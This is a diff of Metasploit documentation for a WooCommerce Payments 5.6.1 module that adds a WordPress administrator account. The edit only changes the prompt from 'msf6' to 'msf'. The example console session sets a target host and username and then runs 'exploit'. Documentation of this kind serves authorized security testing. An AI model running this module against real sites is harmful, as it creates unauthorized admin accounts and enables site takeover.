@@ -46,14 +46,14 @@ The user ID number for a WordPress administrator. Defaults to `1`.
 ### VWooCommerce Payments 5.6.1 on Wordpress 6.2.2
 
 ```
-msf6 > use auxiliary/scanner/http/wp_woocommerce_payments_add_user 
-msf6 auxiliary(scanner/http/wp_woocommerce_payments_add_user) > set rhosts 1.1.1.1
+msf > use auxiliary/scanner/http/wp_woocommerce_payments_add_user 
+msf auxiliary(scanner/http/wp_woocommerce_payments_add_user) > set rhosts 1.1.1.1
 rhosts => 1.1.1.1
-msf6 auxiliary(scanner/http/wp_woocommerce_payments_add_user) > set username h00die
+msf auxiliary(scanner/http/wp_woocommerce_payments_add_user) > set username h00die
 username => h00die
-msf6 auxiliary(scanner/http/wp_woocommerce_payments_add_user) > set verbose true
+msf auxiliary(scanner/http/wp_woocommerce_payments_add_user) > set verbose true
 verbose => true
-msf6 auxiliary(scanner/http/wp_woocommerce_payments_add_user) > exploit
+msf auxiliary(scanner/http/wp_woocommerce_payments_add_user) > exploit
 [*] Running module against 1.1.1.1
 
 [*] Running automatic check ("set AutoCheck false" to disable)
